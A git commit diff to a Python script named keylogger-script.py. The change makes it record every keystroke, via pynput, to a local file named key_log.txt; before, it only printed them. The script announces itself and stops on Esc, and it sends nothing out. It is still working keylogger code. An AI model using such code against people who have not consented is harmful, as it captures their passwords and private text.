86e5f3485af6190515732ba1eea56be87bb98016
tech-Bello <muhammard2k01bello@gmail.com>
2026-03-24 20:53:47 +0100

    added function to save the pressed keys to output file

--- keylogger-script.py
+++ keylogger-script.py
@@ -1,15 +1,28 @@
 from pynput import keyboard
 
+# def on_press(key):
+#     try:
+#         print(f"Key pressed: {key.char}")
+#     except AttributeError:
+#         print(f"Special key: {key}")
+
+# def on_release(key):
+#     if key == keyboard.Key.esc:
+#         return False  # Stop listener
+
+log_file = open("key_log.txt", "a")
+
 def on_press(key):
     try:
-        print(f"Key pressed: {key.char}")
+        log_file.write(key.char)
     except AttributeError:
-        print(f"Special key: {key}")
+        log_file.write(f"[{key}]")
 
 def on_release(key):
     if key == keyboard.Key.esc:
+        log_file.close()
         return False  # Stop listener
-
+    
 if __name__ == "__main__":
     print("start to listen ur keys")
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
